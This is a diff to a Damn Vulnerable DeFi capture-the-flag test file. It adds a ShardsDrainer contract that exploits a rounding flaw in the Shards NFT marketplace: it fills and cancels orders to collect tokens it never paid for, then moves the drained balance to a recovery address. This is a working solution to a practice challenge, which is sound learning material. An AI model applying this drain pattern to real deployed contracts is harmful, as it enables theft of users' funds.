@@ -12,6 +12,20 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+contract ShardsDrainer {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        marketplace.fill(1, 133);
+        marketplace.cancel(1, 0);
+
+        token.approve(address(marketplace), type(uint256).max);
+        uint256 want = token.balanceOf(address(marketplace)) * 1e6 / marketplace.rate();
+        marketplace.fill(1, want);
+        marketplace.cancel(1, 1);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +128,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsDrainer(marketplace, token, recovery);
     }
 
     /**
